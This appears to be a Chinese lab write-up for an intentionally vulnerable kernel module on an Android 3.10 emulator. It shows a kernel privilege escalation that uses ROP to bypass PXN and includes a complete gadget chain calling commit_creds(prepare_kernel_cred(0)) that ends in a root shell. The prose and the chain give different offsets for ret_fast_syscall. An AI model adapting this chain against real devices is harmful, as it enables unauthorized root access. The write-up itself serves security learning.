@@ -1,0 +1,219 @@
+
+前面文章都是在3.4基础上做了缓冲区溢出等简单漏洞利用，3.4的内核没有开PXN保护，都是直接执行的用户态shellcode，3.10开始内核开启了PXN，内核中无法直接调用用户态代码，这时候可以考虑ROP来绕过。
+PXN是Privileged Execute-Never 的缩写，按字面翻译就是“特权执行从不”，是ARM平台下的一项内核保护措施，作用是禁止内核执行用户空间的代码（但没有阻止内核去读取用户空间的数据），它的开启与否主要由页表属性的PXN位来控制
+
+
+
+ 
+
+接下来搭建3.10内核模拟器环境并尝试通过ROP来进行缓冲区溢出漏洞利用。
+
+SDK及模拟器环境不再详细描述。
+arm-eabi-编译工具、JDK环境、SDK、模拟器创建这部分，在VULKLAB1中已经做过介绍，在3.10调试时，这部分也是一样的环境。内核代码的编译和模拟器运行上稍有差别，下面重点描述有差别的地方：
+
+下载编译内核，不方便翻墙所以使用国内镜像地址：
+git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git
+git checkout -t origin/android-goldfish-3.10 -b goldfish3.10
+之前调试通常选3.4版本，现在试试3.10
+
+3.4配置文件为arch/arm/configs/goldfish_armv7_defconfig，3.10没有这个文件，就用ranchu_defconfig也可以。
+给内核添加调试符号，只需要在上面的这个配置文件中添加：CONFIG_DEBUG_INFO=y，如果是goldfish就需要自己添加，ranchu默认配置已经有了，所以不需要更改。
+其他配置选项包括支持内核加载等，如需支持，可以直接添加，或参考VULKLAB1中，通过make menuconfig进行配置。
+
+make ranchu_defconfig
+make -j32
+
+模拟器SDK和VULKLAB1也一样，为了区别于之前的模拟器，我们重新建立一个新的模拟器vulklab2：
+./avdmanager create avd --name vulklab2 -k "system-images;android-19;google_apis;armeabi-v7a"
+
+前面提到sdk里新版本模拟器只支持3.10及以上内核，我们调试的3.10内核也是支持的，所以执行下面命令即可运行模拟器：
+emulator @vulklab2 -kernel arch/arm/boot/zImage -verbose -debug init -show-kernel -no-boot-anim -no-skin -no-audio -no-window -no-snapshot-load -qemu -s
+注意新加了一个 -no-snapshot-load 参数，新模拟器有快照功能，加上这个参数可以忽略快照，重新启动。
+
+另外3.10模拟器上selinux处于使能状态，insmod会提示无权限，需要先setenforce 0关闭selinux才能加载内核模块。
+
+环境搭建好了，下面开始进行正式的调试。
+
+溢出点依然是VULKLAB2中定位到的位置。
+echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCC" > /dev/vulkdev2
+
+Unable to handle kernel paging request at virtual address 42424242
+pgd = d432c640
+[42424242] *pgd=00000000
+Internal error: Oops: 80000205 [#1] PREEMPT SMP ARM
+Modules linked in: vulklab(P)
+CPU: 0 PID: 1078 Comm: sh Tainted: P 3.10.0+ #7
+task: d42be100 ti: d4350000 task.ti: d4350000
+PC is at 0x42424242
+LR is at 0x43434343
+pc : [<42424242>] lr : [<43434343>] psr: 60000153
+sp : d4351f58 ip : 0000000c fp : 00000000
+r10: 00000000 r9 : 00000000 r8 : 00000000
+r7 : 00000035 r6 : d4351f80 r5 : a971e184 r4 : 41414141
+r3 : 0000000a r2 : 80000000 r1 : a971e1b9 r0 : 00000035
+Flags: nZCv IRQs on FIQs off Mode SVC_32 ISA ARM Segment user
+Control: 30c73c7d Table: 5432c640 DAC: fffffffd
+
+SP: 0xd4351ed8:
+1ed8 d4351f78 d4035000 ffffff9c ffffff9c d4350000 00000000 a8ed0343 c00e5764
+1ef8 00000041 42424242 60000153 ffffffff d4351f44 c000ddb8 00000035 a971e1b9
+1f18 80000000 0000000a 41414141 a971e184 d4351f80 00000035 00000000 00000000
+1f38 00000000 00000000 0000000c d4351f58 43434343 42424242 60000153 ffffffff
+1f58 43434343 43434343 43434343 cc94850a 00000000 a971e184 00000035 00000000
+1f78 00000000 c00d7de0 00000000 00000000 d422bb00 00000003 00000035 00000001
+1f98 00000004 c000e244 d4350000 c000e0c0 00000003 00000035 00000001 a971e184
+1fb8 00000035 ffffffff 00000003 00000035 00000001 00000004 a971e184 00000000
+
+现在不能使用用户态shellcode地址覆盖pc指针了，需要在内核里查找rop指令即gadget，并将这些指令地址构造依次覆盖返回地址，完成如下关键函数或指令调用：
+mov r0, #0
+<prepare_kernel_cred>
+<commit_creds>
+并在最后能够成功返回用户态，以便正常执行接下来的shell等后续流程。
+
+
+gadget查找工具有很多，比如
+Ropper: https://github.com/sashs/Ropper
+ROPgadget: https://github.com/JonathanSalwan/ROPgadge
+使用ROPgadget跑内核的ELF要跑很久，所以推荐使用ropper
+
+使用ropper查找gadget：
+可以从github clone下来安装，也可以直接pip install ropper直接安装使用
+$ ropper -f goldfish-3.10/vmlinux --nocolor > gadget.txt
+
+会给出很多gadget，根据需求，我们需要的就是mov r0, #0这样的指令：
+0xc0294148: bl #0xd8ff0; mov r0, #0; pop {r3, pc}; 
+第一条bl指令我们不需要，所以调整一下指令地址就是0xc029414c
+
+然后是prepare_kernel_cred和commit_creds函数地址，之前我们通过/proc/kallsyms查找该地址，现在我们可以通过内核镜像定位到改地址。
+在gdb中载入vmlinux，通过disassemble prepare_kernel_cred和disassemble commit_creds命令定位到函数地址：
+<prepare_kernel_cred> = 0xc0043c54
+<commit_creds> = 0xc00437dc
+或者直接IDA载入vmlinux，也可以找到两个函数的地址
+注意这里是没有开启kalsr的内核，可以直接这样找。
+
+还有一点是返回到用户态。在ret2usr利用方式中是执行了msr cpsr_c, r3切换到用户态，接下来直接执行了payload()函数。
+但rop方式这样行不通，需要能正常返回用户态，然后在用户态执行/bin/sh，就能提权成功了。
+在内核中，正常流程返回用户态是通过ret_fast_syscall函数来实现的，这里会还原用户态寄存器信息等。
+
+$ cat ./arch/arm/kernel/entry-common.S
+......
+ret_fast_syscall:
+ UNWIND(.fnstart )
+ UNWIND(.cantunwind )
+        disable_irq @ disable interrupts
+        ldr r1, [tsk, #TI_FLAGS]
+        tst r1, #_TIF_WORK_MASK
+        bne fast_work_pending
+        asm_trace_hardirqs_on
+
+        /* perform architecture specific actions before user return */
+        arch_ret_to_user r1, lr
+        ct_user_enter
+
+        restore_user_regs fast = 1, offset = S_OFF
+ UNWIND(.fnend )
+......
+
+我们在内核调用栈中往上找就可以找到ret_fast_syscall调用栈
+我们在问题函数vulkdev_write上断点，触发断点，执行到函数返回，查看这时候的内核栈：
+
+(gdb) b *0xbf00009c
+Breakpoint 1 at 0xbf00009c
+(gdb) c
+Continuing.
+
+Breakpoint 1, 0xbf00009c in ?? ()
+(gdb) display /5i $pc
+1: x/5i $pc
+=> 0xbf00009c: push {r4, lr}
+   0xbf0000a0: sub sp, sp, #32
+   0xbf0000a4: mov r4, r2
+   0xbf0000a8: mov r0, sp
+   0xbf0000ac: bic r3, r0, #8128 ; 0x1fc0
+...
+(gdb) ni
+0xbf0000dc in ?? ()
+1: x/5i $pc
+=> 0xbf0000dc: pop {r4, pc}
+   0xbf0000e0: mov r0, sp
+   0xbf0000e4: mov r1, r2
+   0xbf0000e8: bl 0xc01f05a0 <__memzero>
+   0xbf0000ec: mvn r0, #13
+(gdb) x/16x $sp                                                                                                                                                                                             
+0xd4397f50: 0xc37c6480 0xc00d794c 0x00000000 0x00000000
+0xd4397f60: 0xc96b0a80 0xc37c6480 0x00000000 0xbeb259a8
+0xd4397f70: 0x00000020 0x00000000 0x00000000 0xc00d7de0
+0xd4397f80: 0x00000000 0x00000000 0xb2b19fb1 0x00000003
+0xd4397f90: 0xb2b2acfc 0xb2b7c9a2 0x00000004 0xc000e244
+0xd4397fa0: 0xd4396000 0xc000e0c0 0x00000003 0xb2b2acfc
+0xd4397fb0: 0x00000003 0xbeb259a8 0x00000020 0x00000000
+0xd4397fc0: 0x00000003 0xb2b2acfc 0xb2b7c9a2 0x00000004
+(gdb) disassemble ret_fast_syscall
+Dump of assembler code for function ret_fast_syscall:
+   0xc000e0c0 <+0>: cpsid i
+   0xc000e0c4 <+4>: ldr r1, [r9]
+   0xc000e0c8 <+8>: tst r1, #7
+   0xc000e0cc <+12>: bne 0xc000e0f0 <fast_work_pending>
+   0xc000e0d0 <+16>: ldr r1, [sp, #72] ; 0x48
+   0xc000e0d4 <+20>: ldr lr, [sp, #68]! ; 0x44
+   0xc000e0d8 <+24>: msr SPSR_fsxc, r1
+   0xc000e0dc <+28>: clrex
+   0xc000e0e0 <+32>: ldmdb sp, {r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, sp, lr}^
+   0xc000e0e4 <+36>: nop ; (mov r0, r0)
+   0xc000e0e8 <+40>: add sp, sp, #12
+   0xc000e0ec <+44>: movs pc, lr
+End of assembler dump.
+(gdb) 
+
+可以看到栈上0xd4397fa4处地址0xc000e0c0刚好就是ret_fast_syscall函数地址。
+因此在执行完上面的rop指令调用commit_creds(prepare_kernel_cred(0))提权之后，通过诸如add sp, sp, #0x20之类的指令调整栈地址并返回到ret_fast_syscall函数，就能正常返回用户态了。
+至于具体对栈指针调整的字节数，需要计算一下当前栈和ret_fast_syscall栈的距离，再在gadget中查找对应的调整指令。
+经过计算和调试，查找到如下gadget：
+0xc03d180c: bl #0x3d72c0; mov r0, r4; add sp, sp, #0x20; pop {r4, pc}; 
+
+还有一点说一下，参考文档上构造的rop使用的地址是<prepare_kernel_cred>和<commit_creds>首地址，
+但我实测发现，由于在两函数开头第一条指令都是类似push {r3, r4, r5, lr}这样push指令用于保存当前寄存器环境和返回地址，但是实测这会修改并破坏我们构造好的rop链，
+于是我采取跳过第一条指令，取第二条指令地址构造rop，成功的完成利用。这里和参考文档有区别。
+另外ret_fast_syscall地址也一样，如果我们不覆盖栈上原有地址0xc000e0c0，ret_fast_syscall中第二条指令ldr r1, [r9]有读取r9内存，如果当前r9不是一个有效的地址，执行到这里就会发生panic，所以这里我们将原来的栈上地址0xc000e0c0覆盖成0xc000e0d0 <ret_fast_syscall+16>跳过这段内存访问即可。
+
+经调试和构造，构成如下rop链：
+
+  *pc++ = 0xc029414c; // mov r0, #0; pop {r3, pc};
+  *pc++ = 0x42424242; // r3
+  *pc++ = 0xc0043c58; // <prepare_kernel_cred+4> -> pop {r3, r4, r5, pc}
+  *pc++ = 0x42424242; // r3
+  *pc++ = 0x42424242; // r4
+  *pc++ = 0x42424242; // r5
+  *pc++ = 0xc00437e0; // <commit_creds+4> -> pop {r4, r5, r6, pc}
+  *pc++ = 0x42424242; // r4
+  *pc++ = 0x42424242; // r5
+  *pc++ = 0x42424242; // r6
+  *pc++ = 0xc03d1814; // add sp, sp, #0x20; pop {r4, pc};
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; //
+  *pc++ = 0x42424242; // r4
+  *pc++ = 0xc000e0cc; // <ret_fast_syscall+0xc>
+
+返回用户态后在我们的用户态代码中后续执行如下函数，就能成功提权：
+
+  if (!getuid()) {
+    printf("exec root shell\n");
+    execl("/system/bin/sh", "sh", NULL);
+  }
+
+补充说明：
+1. 利用ROP是有局限性的，需要能获取内核镜像，以便定位到所需要的内核地址，因此需要能拿到ROM包，或者能够通过设备上的boot分区dump出镜像(但一般是0600权限低权限用户无权限访问)，或者配合信息泄露漏洞获取信息。
+2. 另外x86_64的rop利用中还有个思路是在通过在用户态空间构造fake_stack，实现恢复寄存器，arm上不知道能否借鉴，后续可以试一下。
+
+
+参考文档：
+https://paper.seebug.org/808/
+https://github.com/sashs/Ropper
+https://www.freebuf.com/articles/system/135402.html
+
